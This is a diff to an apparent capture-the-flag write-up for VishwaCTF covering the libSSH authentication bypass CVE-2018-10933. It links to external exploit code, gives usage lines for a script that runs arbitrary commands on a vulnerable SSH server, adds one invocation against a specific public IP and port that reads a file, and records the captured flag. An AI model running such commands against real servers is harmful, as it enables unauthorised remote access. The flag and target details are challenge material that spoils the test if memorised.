@@ -10,10 +10,10 @@ Upon connecting via netcat (`nc`), the server provides the name of the libSSH li
 
 ### Installation
 
-Clone the repository:
+Clone the code:
 
 ```bash
-git clone https://github.com/blacknbunny/CVE-2018-10933.git
+https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d
 ```
 
 ### Usage 
@@ -22,7 +22,7 @@ git clone https://github.com/blacknbunny/CVE-2018-10933.git
 - Run the exploit script with the appropriate parameters: 
 
 ```py
-python libsshauthbypass.py --host <ip> --port <port> --command <command_line>
+python libsshauthbypass.py <ip> --port <port> --command <command_line>
 ```
 
 Replace <ip> with the IP address of the vulnerable server, <port> with the port number, and <command_line> with the desired command to execute. 
@@ -30,7 +30,15 @@ Replace <ip> with the IP address of the vulnerable server, <port> with the port 
 ### Example 
 
 ```py
-python libsshauthbypass.py --host 192.168.1.100 --port 22 --command "whoami"
+python libsshauthbypass.py 192.168.1.100 --port 22 --command "whoami"
 ```
 
 This command will exploit the vulnerability on a server with IP address 192.168.1.100 listening on port 22, executing the whoami command.
+
+## Exploit
+
+```py
+python exploit.py 13.234.11.113 --port 32176 --command "cat location.txt"
+```
+
+> Flag: VishwaCTF{elrow-club-pune}
